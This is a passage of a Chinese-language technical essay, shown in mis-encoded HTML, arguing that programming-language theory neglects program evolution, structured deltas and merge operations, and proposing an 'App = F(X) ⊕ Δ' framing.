<li>â€œæ•´ä¸ªç¨‹åºæ—çš„æ¼”åŒ–ç»“æ„æ˜¯å¦æœ‰ç•Œã€å¯æ§ã€å¯é€†â€å‡ ä¹æ²¡æœ‰ç»Ÿä¸€ç†è®ºã€‚</li>
</ul>
<p>è¿™æ„æˆç¬¬äºŒä¸ªä¸¥é‡ç¼ºé™·ï¼š<strong>ç¼ºä¹ä¸€å¥—â€œé¢å‘æ¼”åŒ–çš„å½¢å¼ç†è®ºâ€â€”â€”æŠŠå·®é‡ã€åˆå¹¶ã€ç‰ˆæœ¬æ—æœ¬èº«ä½œä¸ºä¸€ç­‰å…¬æ°‘å¯¹è±¡</strong>ã€‚</p>
<h3 data-id="heading-3">1.3 èŒƒç•´è®ºåœ¨ PL ä¸­ï¼šä»â€œç©ºé—´è¯­è¨€â€é€€åŒ–æˆâ€œå˜æ¢è¯­æ³•â€</h3>
<p>èŒƒç•´è®ºæœ¬èº«æ˜¯ä¸€ä¸ªæå…¶é€šç”¨çš„æ•°å­¦å…ƒè¯­è¨€ï¼Œæ—¢å¯ä»¥åšä»£æ•°ï¼Œä¹Ÿå¯ä»¥åšå‡ ä½•/æ‹“æ‰‘ï¼Œç”¨äºç ”ç©¶ç©ºé—´å’Œå±€éƒ¨æ•°æ®ã€‚ä½†åœ¨ PL ç¤¾åŒºä¸­çš„ä¸»æµç”¨æ³•ï¼Œå¤§è‡´æ˜¯ï¼š</p>
<ul>
<li>å¯¹è±¡ â‰ˆ ç±»å‹ï¼›</li>
<li>æ€å°„ â‰ˆ å‡½æ•°/ç¨‹åºï¼›</li>
<li>Monad/Functor/Arrow/Applicative â‰ˆ ä¸€å¥— effect ç»„åˆè¯­æ³•ã€‚</li>
</ul>
<p>ä»è¿™ä¸€ç”¨æ³•å‡ºå‘ï¼ŒèŒƒç•´è®ºä¸»è¦è¢«ç”¨æ¥ï¼š</p>
<ul>
<li>æŠŠ effect æŠ½è±¡æ‰ï¼ˆIO/State/Exception éƒ½åŒ…è£…æˆ Monadï¼‰ï¼›</li>
<li>æŠŠå¤æ‚é€»è¾‘è¡Œä¸ºè¡¨è¾¾æˆçº¯å‡½æ•°çš„ç»„åˆï¼›</li>
<li>ç»™è¯­æ³•æ„é€ ä¸€ä¸ªâ€œæ¼‚äº®çš„ä»£æ•°éª¨æ¶â€ã€‚</li>
</ul>
<p>è¿™éå¸¸æœ‰ç”¨ï¼Œä½†å®ƒå¼ºåŒ–äº†ä¸€ä¸ª <strong>â€œå˜æ¢ä¸­å¿ƒâ€</strong> çš„ä¸–ç•Œè§‚ï¼š</p>
<blockquote>
<p>å˜æ¢ï¼ˆfunctionï¼‰æ˜¯ä¸»è§’ï¼›<br/>
ç±»å‹æ˜¯å˜æ¢çš„æºå’Œé¶ï¼›<br/>
æˆ‘ä»¬å…³å¿ƒçš„æ˜¯å˜æ¢å¦‚ä½•ç»„åˆï¼Œè€Œä¸æ˜¯è¿™äº›å˜æ¢æ‰€ä½œç”¨çš„â€œç©ºé—´æœ¬ä½“â€è‡ªèº«çš„ç»“æ„å’Œæ¼”åŒ–ã€‚</p>
</blockquote>
<p>å¯¹åº”åˆ°æ•°å­¦å²ä¸Šï¼Œè¿™æœ‰ç‚¹åƒåœç•™åœ¨â€œå˜æ¢ç¾¤â€é˜¶æ®µï¼Œè€Œæ²¡æœ‰çœŸæ­£è½¬å‘å¯¹â€œç©ºé—´æœ¬èº«â€çš„ç ”ç©¶ï¼š</p>
<ul>
<li>ç¾¤è®ºå¯ä»¥ç ”ç©¶å¯¹ç§°å˜æ¢ï¼›</li>
<li>ä½†å‡ ä½•å’Œç‰©ç†ä¼šé—®ï¼šç©ºé—´æ˜¯ä»€ä¹ˆï¼Ÿåœºæ˜¯ä»€ä¹ˆï¼Ÿå±€éƒ¨æ‰°åŠ¨å¦‚ä½•å åŠ ï¼Ÿ</li>
</ul>
<p>åœ¨ PL ä¸­ï¼Œæˆ‘ä»¬å¤§é‡ç ”ç©¶â€œç¨‹åºä½œä¸ºæ€å°„â€ï¼Œâ€œç¨‹åºç»„åˆçš„è§„å¾‹â€ï¼Œå´å‡ ä¹ä¸ç ”ç©¶ï¼š</p>
<blockquote>
<p>â€œè¯­è¨€æ‰€ç”Ÿæˆçš„å…¨éƒ¨ç¨‹åºç»“æ„ï¼Œä»¥åŠè¿™äº›ç»“æ„ä¹‹é—´æ‰€æœ‰åˆæ³•å˜å½¢/æ¼”åŒ–æ„æˆçš„ç©ºé—´â€æ˜¯æ€æ ·çš„ï¼Ÿ<br/>
è¿™ä¸ªç©ºé—´æœ‰ä»€ä¹ˆåæ ‡ï¼Ÿä»€ä¹ˆæ˜¯â€œå±€éƒ¨æ‰°åŠ¨â€ï¼Ÿæ²¿è·¯å¾„ç´¯ç§¯æ‰°åŠ¨äº§ç”Ÿçš„â€œç§¯åˆ†â€å¦‚ä½•å®šä¹‰ï¼Ÿ</p>
</blockquote>
<p>è¿™å¯¼è‡´äº†ä¸‰ä¸ªç»“æœï¼š</p>
<ol>
<li>
<p>èŒƒç•´è®ºè¢«æ”¶ç¼–è¿›äº†â€œå‡½æ•°å¼ + ç±»å‹è¯­ä¹‰â€çš„ä½“ç³»ï¼Œ<br/>
å¾ˆå°‘ç”¨äºè¡¨è¾¾â€œç»“æ„ç©ºé—´ä¹‹é—´çš„æ˜ å°„â€â€œå¤šè¡¨è±¡ä¹‹é—´çš„å…³è”â€ã€‚</p>
</li>
<li>
<p>å¯¹è±¡è¢«ç­‰ä»·äº type åï¼Œâ€œåæ ‡ç³»å”¯ä¸€ç¡®å®šå€¼â€â€œåœºåœ¨æ¯ä¸€ç‚¹èµ‹å€¼â€è¿™ç§æ¦‚å¿µå°±å¾ˆéš¾è‡ªç„¶è¿›å…¥ç†è®ºã€‚
ç±»å‹åœ¨æœ¬è´¨ä¸Šæ˜¯æŠŠä¸€æ’®å€¼å½’å…¥ä¸€ä¸ªç­‰ä»·ç±»ï¼Œè€Œä¸æ˜¯æŠŠæ¯ä¸ªç‚¹æ”¾åœ¨åæ ‡ç³»ä¸­çš„å”¯ä¸€ä½ç½®ã€‚</p>
</li>
<li>
<p>ç ”ç©¶ç„¦ç‚¹å±€é™åœ¨â€œå˜æ¢å¦‚ä½•ç»„åˆâ€ï¼Œ<br/>
è€Œä¸æ˜¯â€œè¿™äº›å˜æ¢ä½œç”¨çš„ç¨‹åºç©ºé—´æœ¬èº«é•¿ä»€ä¹ˆæ ·ã€å±€éƒ¨ç»“æ„å¦‚ä½•ã€å¾®æ‰°å¦‚ä½•å åŠ â€ã€‚</p>
</li>
</ol>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼š</p>
<blockquote>
<p>èŒƒç•´è®ºæœ¬æ¥å¯ä»¥å¸®åŠ©æˆ‘ä»¬ç ”ç©¶â€œæ¨¡å‹ç©ºé—´ + å¤šè¡¨è±¡ + å·®é‡æ˜ å°„â€ï¼Œ<br/>
ä½†ç›®å‰è¢«é™ç¼©æˆäº†â€œé«˜åº¦é«˜çº§çš„ç±»å‹è¯­ä¹‰åŒ…è£…â€ã€‚</p>
</blockquote>
<p>è¿™åœ¨ä¸–ç•Œè§‚ä¸Šï¼Œæ˜¯ä¸€ç§â€œä»ä¸€å¼€å§‹å°±é€‰çª„äº†â€çš„ç”¨æ³•ã€‚</p>
<h2 data-id="heading-4">äºŒã€ç°å®ä¸–ç•ŒçœŸæ­£éš¾çš„é—®é¢˜ï¼šé•¿æœŸæ¼”åŒ– + å¯å˜æ€§ç®¡ç†</h2>
<p>å·¥ç¨‹å®è·µä¸­ï¼Œå‡ ä¹æ‰€æœ‰ä¸­å¤§å‹ç³»ç»Ÿçš„çœŸå®é—®é¢˜éƒ½ç»•ä¸å¼€è¿™å‡ ä¸ªè¯ï¼š</p>
<ul>
<li>ç‰ˆæœ¬æ¼”åŒ–ï¼ˆV1 â†’ V2 â†’ â€¦ï¼‰ï¼›</li>
<li>å®¢æˆ·/åœ°åŒº/è¡Œä¸šå®šåˆ¶ï¼ˆäº§å“çº¿ï¼‰ï¼›</li>
<li>é•¿æœŸç»´æŠ¤ä¸­çš„è…åŒ–ä¸æŠ€æœ¯å€ºï¼›</li>
<li>å¤šæ¨¡å‹é—´çš„ä¸€è‡´æ€§å’Œâ€œæ¦‚å¿µæ¼‚ç§»â€ã€‚</li>
</ul>
<h3 data-id="heading-5">2.1 æˆ‘ä»¬æœ€å¤§çš„é—®é¢˜ä»æ¥ä¸æ˜¯â€œå†™å‡ºä¸€ä¸ªå¹²å‡€çš„ v1.0â€</h3>
<p>å‡è®¾ä½ æœ‰ä¸€ä¸ªå®Œç¾ç±»å‹å®‰å…¨çš„è¯­è¨€ã€ä¸€ä¸ªç»è¿‡å½¢å¼éªŒè¯çš„ç¼–è¯‘å™¨ï¼Œç„¶åä½ å†™äº†ä¸€ä¸ª v1.0ï¼š</p>
<ul>
<li>ç¼–è¯‘é€šè¿‡ï¼›</li>
<li>å…³é”®å±æ€§éªŒè¯é€šè¿‡ï¼›</li>
<li>éƒ¨ç½²ç¨³å®šã€‚</li>
</ul>
<p>æ¥ä¸‹æ¥äº”å¹´å‘ç”Ÿçš„æ˜¯ï¼š</p>
<ul>
<li>éœ€æ±‚å˜äº†ï¼›</li>
<li>æ–°æ³•è§„/æ–°æ”¿ç­–ï¼›</li>
<li>æŸå¤§å®¢æˆ·æƒ³è¦ä¸¤ä¸ªå¥‡æ€ªçš„ç‰¹æ€§ï¼›</li>
<li>æ—§æ¨¡å—ä¸èƒ½åœæœºï¼Œåªèƒ½é€æ­¥è¿ç§»ï¼›</li>
<li>éƒ¨åˆ†å›¢é˜Ÿä¸åŒæ ˆç»´æŠ¤å­ç³»ç»Ÿï¼Œå„è‡ªæ¼”åŒ–ã€‚</li>
</ul>
<p>è¿™æ—¶ä½ é¢å¯¹çš„æ˜¯ï¼š</p>
<ul>
<li>æºç æ ‘ä¸Šå‡ åä¸ªåˆ†æ”¯ï¼›</li>
<li>æ•°æ®æ¨¡å‹ schema ä¸€ééè¿ç§»ï¼›</li>
<li>é…ç½®å’Œ feature flag æ»¡å¤©é£ï¼›</li>
<li>æ–‡æ¡£æ»åï¼Œæ¨¡å‹ä¸ä»£ç è„±èŠ‚ã€‚</li>
</ul>
<p>åœ¨è¿™ä¸€å †æ··ä¹±ä¸­ï¼š</p>
<blockquote>
<p>æˆ‘ä»¬å®é™…æ“ä½œçš„åŸºæœ¬å•ä½ï¼Œä¸å†æ˜¯â€œå®Œæ•´ç¨‹åºâ€ï¼Œè€Œæ˜¯å„ç§ granularity çš„ <strong>Î”ï¼š<br/>
å° patchã€schema diffã€é…ç½® overlayã€DSL fragment çš„å¢åˆ æ”¹ã€rewrite è„šæœ¬â€¦â€¦</strong></p>
</blockquote>
<p>å¯ä»¥è¯´ï¼š<br/>
<strong>åœ¨é•¿æœŸæ¼”åŒ–è¯­å¢ƒé‡Œï¼Œä¸€åˆ‡å·¥ç¨‹å·¥ä½œéƒ½æ˜¯åœ¨æ“ä½œ Î”ã€‚</strong></p>
<p>ä½†è¿™äº› Î” åœ¨ç†è®ºä¸Šå¤„äºä»€ä¹ˆåœ°ä½ï¼Ÿ</p>
<ul>
<li>åœ¨ Git é‡Œï¼Œå®ƒæ˜¯æ–‡æœ¬ diffï¼›</li>
<li>åœ¨æ•°æ®åº“è¿ç§»é‡Œï¼Œå®ƒæ˜¯ DDL ç‰‡æ®µï¼›</li>
<li>åœ¨é…ç½®é‡Œï¼Œå®ƒæ˜¯æŸç§ patch/overlayï¼›</li>
<li>åœ¨ MDA/ä½ä»£ç å¹³å°é‡Œï¼Œå®ƒæ˜¯â€œç”Ÿæˆåæ‰‹å·¥æ”¹åŠ¨çš„ä¸€å¨â€ã€‚</li>
</ul>
<p>å®ƒä»¬æ˜¯æ—¥å¸¸æ ¸å¿ƒï¼Œå´è¢«è§†ä¸ºâ€œå·¥ç¨‹ç»†èŠ‚â€ï¼Œè¢«è®¤ä¸ºæ˜¯éœ€è¦è¢«æ‘†è„±çš„å™ªéŸ³å’Œåç§»ï¼Œå¾ˆå°‘è¢«ç³»ç»ŸæŠ½è±¡ã€‚</p>
<h3 data-id="heading-6">2.2 ç”Ÿæˆä¸æ¼”åŒ–çš„å‰²è£‚ï¼šF(X) vs â€œæ‰‹å·¥æ”¹ä¸€å †â€</h3>
<p>æ¨¡å‹é©±åŠ¨å·¥ç¨‹ã€ä»£ç ç”Ÿæˆå™¨ã€ä½ä»£ç å¹³å°ã€æ¨¡æ¿ç³»ç»Ÿï¼ŒåŸºæœ¬éƒ½éµå¾ªä¸€ä¸ªæ¨¡å¼ï¼š</p>
<ul>
<li>æè¿°ä¸€ä¸ªæ¨¡å‹ Xï¼›</li>
<li>é€šè¿‡ç”Ÿæˆå™¨ F(X)ï¼Œç”Ÿæˆéª¨æ¶æˆ–å¤§é‡æ ·æ¿ä»£ç ï¼›</li>
<li>ç„¶ååœ¨ç”Ÿæˆç»“æœé‡Œç»§ç»­æ‰‹æ”¹ã€è¡¥é€»è¾‘ã€ä¿® bugã€‚</li>
</ul>
<p>ç°å®å…¬å¼å…¶å®æ˜¯ï¼š</p>
<blockquote>
<p>App = F(X) + manual adjustments</p>
</blockquote>
<p>æ‰‹å·¥è°ƒæ•´é‚£ä¸€å¨æœ‰å‡ ä¸ªæ˜¾è‘—é—®é¢˜ï¼š</p>
<ul>
<li>æ— ç»“æ„ï¼ˆæ•£å¸ƒåœ¨å„ç§æ–‡ä»¶ä¸­ï¼‰ï¼›</li>
<li>æ— ç»Ÿä¸€è¯­ä¹‰ï¼ˆéš¾ä»¥åˆ†æï¼‰ï¼›</li>
<li>ä¸å¯é€†ï¼Œä¹Ÿå¾ˆéš¾æŠ½å‡ºæˆ Î”ï¼›</li>
<li>æ¨¡å‹å’Œç”Ÿæˆä»£ç å†ä¹ŸåŒæ­¥ä¸å›å»äº†ã€‚</li>
</ul>
<p>è¿™é€ æˆå‡ ä¸ªå…¸å‹åæœï¼š</p>
<ul>
<li>é€ƒç¦»æ¨¡å‹ï¼šå›¢é˜Ÿä¸€å¼€å§‹ç”¨ MDA/ä½ä»£ç ï¼Œåæ¥å‘ç°ç”Ÿæˆä»£ç æ”¹å¤šäº†ï¼Œå†ä¹Ÿä¸æ•¢é‡ç”Ÿæˆï¼Œåªå¥½â€œè„±ç¦»å¹³å°è‡ªå·±å¹²â€ï¼›</li>
<li>æŠ€æœ¯å€ºå †ç§¯ï¼šæ— æ³•ç³»ç»Ÿæ¢³ç†å“ªäº›å˜æ›´æ˜¯â€œä¸€èˆ¬æ€§æ‰©å±•â€ã€å“ªäº›æ˜¯â€œå®¢æˆ·ä¸´æ—¶ hackâ€ï¼›</li>
<li>å¹³å°æ–¹æŸæ‰‹æ— ç­–ï¼šå¹³å°å‡çº§ä¸€æ¬¡ï¼Œä¸‹æ¸¸äº§å“çº¿å…¨éƒ¨é‡æµ‹ï¼Œå‡ åä¸ªå®¢æˆ·å„æœ‰ä¸€å¥— patchã€‚</li>
</ul>
<p>ä»ç†è®ºè§’åº¦çœ‹ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸é²œæ˜çš„æ–­è£‚ï¼š</p>
<blockquote>
<p>ç”Ÿæˆ F(X) è¢«å½“ä½œâ€œç†è®ºä¸Šæœ‰ä»·å€¼çš„ä¸œè¥¿â€ï¼Œ<br/>
Î”ï¼ˆå„ç±»å®šåˆ¶ä¸æ¼”åŒ–ï¼‰è¢«è§†ä¸ºâ€œè½åœ°è¿‡ç¨‹ä¸­çš„è„æ´»ç´¯æ´»â€ï¼Œæ²¡æœ‰è¢«çº³å…¥ç»Ÿä¸€å½¢å¼æ¡†æ¶ã€‚</p>
</blockquote>
<p>è€Œ GRC çš„æ ¸å¿ƒå…¬å¼æ­£å¥½æ”¹å†™è¿™ä¸ªæ¨¡å¼ï¼š</p>
<pre><code class="hljs language-text" lang="text">App = Generator&lt;DSL&gt; âŠ• Î”
å³ Y = F(X) âŠ• Î”
</code></pre>
<p>å…¶ä¸­ï¼š</p>
<ul>
<li>F(X)ï¼šè§„èŒƒåŒ–çš„â€œä¸»å¹²â€ï¼Œç”±ç”Ÿæˆå™¨+DSL ç”Ÿæˆï¼›</li>
<li>Î”ï¼šç»“æ„åŒ–å·®é‡ï¼Œæ”¶çº³æ‰€æœ‰åç¦»ä¸»å¹²çš„ä¸œè¥¿ï¼›</li>
<li>âŠ•ï¼šæœ‰å½¢å¼è¯­ä¹‰å’Œä»£æ•°æ€§è´¨çš„åˆå¹¶è¿ç®—ã€‚</li>
</ul>
<p><strong>ä¸¥é‡ç¼ºé™·åœ¨äºï¼šæˆ‘ä»¬æœ‰å¤§é‡å…³äº F çš„ç†è®ºï¼Œå´å‡ ä¹æ²¡æœ‰å…³äº Î” å’Œ âŠ• çš„ç»Ÿä¸€ç†è®ºã€‚</strong><br/>
GRC æŠŠè¿™ä¸¤ä¸ªâ€œé»‘ç®±â€æ‹‰åˆ°ä¸­å¿ƒæ¥ç ”ç©¶ã€‚</p>
<p>è¿›ä¸€æ­¥è¯´ï¼šå¦‚æœä¸åœ¨è¯­è¨€å’Œæ¨¡å‹çš„å±‚é¢æ˜¾å¼å®šä¹‰â€œç»“æ„åæ ‡â€å’Œâ€œå·®é‡è§„åˆ™â€ï¼ŒÎ” æ°¸è¿œåªèƒ½ä»¥â€œæ–‡æœ¬ patch/è„šæœ¬â€çš„å½¢å¼å‡ºç°ï¼Œæ— æ³•è¿›å…¥ç†è®ºä¸­å¿ƒã€‚</p>
<h3 data-id="heading-7">2.3 â€œå¯å˜æ€§ç®¡ç†â€åœç•™åœ¨æšä¸¾æ‰©å±•ç‚¹é˜¶æ®µ</h3>
<p>è½¯ä»¶äº§å“çº¿å·¥ç¨‹æ‰€æå‡ºçš„æ ¸å¿ƒæŠ€æœ¯é—®é¢˜æ˜¯æ‰€è°“çš„å¯å˜æ€§ç®¡ç†ã€‚è¿™å‡ ä¹æ˜¯ä¸€ä¸ªä¸‡èƒ½ç®©ç­å‹çš„é—®é¢˜ã€‚æˆ‘ä»¬åœ¨è½¯ä»¶å¼€å‘å’Œæ¼”åŒ–è¿‡ç¨‹ä¸­æ‰€é­é‡çš„å‡ ä¹æ‰€æœ‰å›°éš¾éƒ½èƒ½å¤Ÿå¾ˆå®¹æ˜“çš„è¢«å½’å› äºåº”å¯¹å˜åŒ–çš„èƒ½åŠ›ä¸è¶³ã€‚</p>
<p>è½¯ä»¶äº§å“çº¿ï¼ˆSPLï¼‰ã€feature modelã€plugin architectureï¼Œéƒ½åœ¨è°ˆ variability managementã€‚å®ƒä»¬åšäº†ä¸å°‘äº‹æƒ…ï¼š</p>
<ul>
<li>æŠŠç‰¹æ€§æŠ½è±¡æˆ featureï¼›</li>
<li>å»ºå›¾ï¼ˆfeature diagramï¼‰ï¼›</li>
<li>ç”¨æ¡ä»¶ç¼–è¯‘ã€å·®é‡æ¨¡å—ã€ç­–ç•¥æ³¨å…¥ç­‰æ–¹å¼å®ç°å˜ä½“ã€‚</li>
</ul>
<p>ä½†ä¸»æµå®è·µä»ç„¶æœ‰å‡ ä¸ªå±€é™ï¼š</p>
<ol>
<li>
<p>æ‰©å±•ç‚¹å¤§å¤šæ˜¯<strong>é¢„å…ˆå®šä¹‰çš„</strong></p>
<ul>
<li>â€œè¿™é‡Œç•™ä¸ª hookï¼Œå°†æ¥å®¢æˆ·å¯ä»¥åœ¨è¿™é‡Œæ’â€ï¼Ÿ</li>
<li>â€œè¿™ä¸ªç­–ç•¥ç”¨æ¥å£å°è£…èµ·æ¥ï¼Œä»¥åå¯ä»¥æ¢å®ç°â€ã€‚</li>
</ul>
<p>è¿™å¯¹å¯é¢„æœŸçš„å˜åŒ–æœ‰æ•ˆï¼Œä½†å¯¹â€œæ–°å˜åŒ–ç‚¹éšæ—¶å†’å‡ºæ¥â€å°±åƒåŠ›äº†ã€‚</p>
</li>
<li>
<p>â€œCoreâ€ å’Œ â€œVariantâ€ å¹¶ä¸åœ¨åŒä¸€æ¨¡å‹ç©ºé—´</p>
<ul>
<li>Core æ˜¯æŸç§ä»£ç /æ¶æ„ï¼›</li>
<li>feature model åœ¨å¦ä¸€å¥—é€»è¾‘æ ‘é‡Œï¼›</li>
<li>äºŒè€…ä¹‹é—´æ²¡æœ‰ç»Ÿä¸€çš„ Î”/âŠ• ç»“æ„ã€‚</li>
</ul>
</li>
<li>
<p>æ„é€ ä¸æ¼”åŒ–ä¾æ—§æ˜¯åˆ†è£‚æ´»åŠ¨</p>
<ul>
<li>Core æ˜¯â€œæ„é€ â€ï¼›</li>
<li>Variant æ˜¯â€œæ¼”åŒ–/å®šåˆ¶â€ï¼›</li>
<li>ä¸åœ¨åŒä¸€æ–¹ç¨‹é‡Œã€‚</li>
</ul>
</li>
</ol>
<p>æ‰€ä»¥ä½ ä¼šçœ‹åˆ°ï¼š</p>
<blockquote>
<p>å¾ˆå¤š SPL å®è·µåœ¨ paper é‡Œçœ‹èµ·æ¥å¾ˆä¼˜é›…ï¼Œ<br/>
çœŸæ­£åšå¤§è§„æ¨¡äº§å“çº¿æ—¶ï¼Œä¾ç„¶è¦é åˆ†æ”¯ + æ‰‹å·¥ diff + åˆå¹¶å¤§æˆ˜æ¥æ’‘ç€ã€‚</p>
</blockquote>
<p>æœ¬è´¨ä¸Šï¼Œ<strong>ç‰¹å¾ä»£æ•°ç¼ºä¹ä¸æ¨¡å‹ç©ºé—´çš„ä¸¥å¯†ç»‘å®šï¼Œå˜ä½“ä»ç„¶å¤ªå¤šåœç•™åœ¨ä»£ç /å®çº§ï¼Œè€Œä¸æ˜¯è¯­ä¹‰æ¨¡å‹çº§</strong>ã€‚</p>
<blockquote>
<p>æ ¹æ®ç†è®ºä¸Šçš„åˆ†æï¼Œå¯å˜æ€§ç®¡ç†çš„çœŸæ­£å›°éš¾åœ¨äºå¦‚ä½•æœ‰æ•ˆçš„ç®¡æ§é¢„æ–™ä¹‹å¤–çš„ï¼ˆunexpectedï¼‰å˜åŒ–ã€‚å¦‚æœæˆ‘ä»¬å¯¹ä¸€ä¸ªé¢†åŸŸéå¸¸ç†Ÿæ‚‰ï¼Œè€Œä¸”é¢†åŸŸå†…çš„å˜åŒ–æ–¹å¼ä¸ºæœ‰é™çš„å‡ ç§ï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨å…³é”®ä½ç½®è®¾ç½®å‡ ä¸ªæ°åˆ°å¥½å¤„çš„æ‰©å±•ç‚¹ï¼Œä¸¾é‡è‹¥è½»çš„è§£å†³å¯å˜æ€§é—®é¢˜ã€‚ä½†å¦‚æœå˜åŒ–çš„å¯èƒ½ä½ç½®ä¸æ–­å¢åŠ ï¼Œå˜åŒ–çš„æ–¹å¼ä¸æ–­ç¿»æ–°èŠ±æ ·ï¼ˆæ¢å¥è¯è¯´ï¼Œä¹Ÿå°±æ˜¯å˜åŒ–çš„è‡ªç”±åº¦ä¸æ–­å¢åŠ ï¼Œç›´è‡³è¶‹äºæ— ç©·ï¼‰ï¼Œé‚£ä¹ˆè¿Ÿæ—©è¿™ç§å˜åŒ–çš„è‡ªç”±åº¦ä¼šè¶…è¶Šæ‰‹å·¥æšä¸¾èƒ½å¤Ÿç®¡æ§çš„èŒƒå›´ã€‚åœ¨è¿™ç§å……æ»¡æœªçŸ¥çš„æ¼”åŒ–å›¾æ™¯ä¸‹ï¼Œæˆ‘ä»¬å¦‚ä½•å®ç°å¯¹æ— é™å¤šçš„å˜åŒ–è‡ªç”±åº¦çš„æœ‰æ•ˆæè¿°å’Œç®¡æ§ï¼Ÿåœ¨ç‰©ç†å­¦ä¸­ï¼Œè¿™å®é™…ä¸Šå±äºä¸€ä¸ªå·²ç»è¢«è§£å†³äº†çš„é—®é¢˜ã€‚</p>
</blockquote>
<blockquote>
<p>åœ¨é«˜ä¸­é˜¶æ®µæˆ‘ä»¬æ‰€å­¦ä¹ çš„ç‰›é¡¿ç‰©ç†å­¦æ˜¯æ‰€è°“å¤å…¸åŠ›å­¦ä¸­çš„åˆšä½“åŠ›å­¦ã€‚å®ƒçš„ä¸–ç•Œè§‚æ˜¯å®Œå…¨æœºæ¢°åŒ–çš„ï¼šåˆšä½“çš„è¿åŠ¨å®Œå…¨ç”±å®ƒçš„è´¨å¿ƒåæ ‡å’Œå°ºå¯¸å½¢çŠ¶æœå‘ç­‰å°‘æ•°å‡ ä¸ªå‚æ•°æ¥æè¿°ï¼Œåˆšä½“çš„å†…éƒ¨æ„é€ æ— æ³•è¢«è§‚æµ‹ä¹Ÿæ— å…³ç´§è¦ï¼Œåˆšä½“ä¹‹é—´é€šè¿‡ç›´æ¥æ¥è§¦å‘ç”Ÿç›¸äº’ä½œç”¨ï¼Œåˆšä½“çš„å½¢çŠ¶å¿…é¡»ç²¾ç¡®åŒ¹é…æ‰èƒ½æ„æˆä¸€ä¸ªæ— ç¼çš„æ•´ä½“ï¼ˆå¯ä»¥å¯¹æ¯”ä¸€ä¸‹è½¯ä»¶ç»„ä»¶çš„é»‘ç®±æ¨¡å‹ï¼‰ã€‚å³ä½¿æ˜¯åœ¨å¤å…¸åŠ›å­¦ä¸­ï¼Œç¨å¾®é«˜çº§ä¸€ç‚¹çš„è§‚ç‚¹ä¹Ÿéƒ½ä¼šè½¬æ¢åˆ°æ‹‰æ ¼æœ—æ—¥è¡¨è¿°æˆ–è€…å“ˆå¯†å°”é¡¿è¡¨è¿°ï¼Œå®ƒçš„ç²¾ç¥å®è´¨æ˜¯è½¬å‘åœºè®ºçš„ä¸–ç•Œè§‚ã€‚æ‰€è°“çš„åœºï¼ˆFieldï¼‰ï¼Œå…¶å®å°±æ˜¯å»ºç«‹ä¸€ä¸ªæ— æ‰€ä¸åœ¨çš„åæ ‡ç³»ï¼Œç„¶ååœ¨åæ ‡ç³»çš„æ¯ä¸€ç‚¹ä¸Šéƒ½å¯ä»¥æŒ‡å®šä¸€ä¸ªç‰©ç†é‡ã€‚åœºçš„è‡ªç”±åº¦æ˜¯æ— é™çš„ï¼Œä½†æ˜¯é€šè¿‡åæ ‡ç³»å®ƒæ˜¯å¯æè¿°çš„ã€å¯å®šä¹‰çš„ã€å¯ç ”ç©¶çš„ï¼Œåœ¨åæ ‡ç³»çš„æ¯ä¸€ç‚¹ä¸Šæˆ‘ä»¬éƒ½å¯ä»¥ç²¾ç¡®çš„åº¦é‡å±€éƒ¨çš„å˜åŒ–ã€‚åŸºäºåŒæ ·çš„ç²¾ç¥ï¼Œå¯é€†è®¡ç®—çš„åŸºæœ¬è®¾å®šæ˜¯é¦–å…ˆå»ºç«‹ä¸€ä¸ªè¶³å¤Ÿç²¾ç»†å’Œé€šç”¨çš„é¢†åŸŸæè¿°åæ ‡ç³»ï¼Œåœ¨è¿™ä¸ªåæ ‡ç³»ä¸­æˆ‘ä»¬èƒ½å¤Ÿåšåˆ°æŒ‡å“ªæ‰“å“ªå’Œæ‰“å“ªæŒ‡å“ªï¼ˆåæ ‡çš„å”¯ä¸€æ€§ï¼‰ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">ä¸‰ã€æ ¸å¿ƒç¼ºé™·å½’çº³ï¼šç¼ºçš„ä¸æ˜¯â€œæ›´å¼ºç±»å‹â€ï¼Œè€Œæ˜¯ä¸€å¥—å…³äºâ€œå˜åŒ–â€çš„ç§‘å­¦</h2>
<p>æŠŠä¸Šè¿°é—®é¢˜å‹ç¼©ï¼Œå¯ä»¥å‹¾å‹’å‡ºå½“å‰ PL/SE ç†è®ºçš„å‡ ä¸ªç»“æ„æ€§çŸ­æ¿ã€‚</p>
<h3 data-id="heading-9">3.1 ç ”ç©¶é‡å¿ƒæ”¾é”™å±‚çº§ï¼šèšç„¦â€œå•ä¸ªç¨‹åºâ€ï¼Œå¿½è§†â€œç¨‹åºæ—â€</h3>
<ul>
<li>æˆ‘ä»¬åœ¨â€œå•ä¸€ç¨‹åº P çš„ç±»å‹å®‰å…¨ã€è¯­ä¹‰æ­£ç¡®æ€§â€ä¸Šï¼Œå‡ ä¹åšåˆ°äº†æè‡´ï¼›</li>
<li>å¯¹â€œç¨‹åºæ— {Pâ‚€, Pâ‚, â€¦, Pâ‚™} çš„ç»“æ„ä¸æ¼”åŒ–â€ï¼Œåªæœ‰é›¶ç¢çš„ç†è®ºï¼Œä¸æˆä¸»çº¿ã€‚</li>
</ul>
<p>æ¢å¥è¯è¯´ï¼š</p>
<blockquote>
<p>ç±»å‹è®ºä¹‹äºé™æ€å®‰å…¨ï¼Œå·²ç»æ˜¯ä¸€é—¨æˆç†Ÿçš„â€œç§‘å­¦â€ï¼›<br/>
è€Œå…³äºâ€œé•¿æœŸæ¼”åŒ–åŠå…¶ç»“æ„â€çš„ä¸œè¥¿ï¼Œè¿˜æ•£è½åœ¨å¤šä¸ªå­é¢†åŸŸï¼Œç¼ºä¹æ€»ç†è®ºã€‚</p>
</blockquote>
<h3 data-id="heading-10">3.2 å·®é‡ï¼ˆÎ”ï¼‰ä¸åˆå¹¶ï¼ˆâŠ•ï¼‰æ²¡æœ‰è¢«å½“ä½œä¸€ç­‰æ•°å­¦å¯¹è±¡</h3>
<p>ç°å®ä¸­æˆ‘ä»¬ä¸æ–­â€œå‘æ˜â€å·®é‡ï¼š</p>
<ul>
<li>Git æœ‰è¡Œæ–‡æœ¬ diff + mergeï¼Œä½†è¯­ä¹‰å¼±ã€å™ªå£°é«˜ã€åˆå¹¶æ— å°é—­æ€§ï¼›</li>
<li>äº§å“çº¿æœ‰ feature algebraï¼Œä½†é€šå¸¸ä¸å®ç° artifact ä¹‹é—´å­˜åœ¨å·¨å¤§é¸¿æ²Ÿï¼›</li>
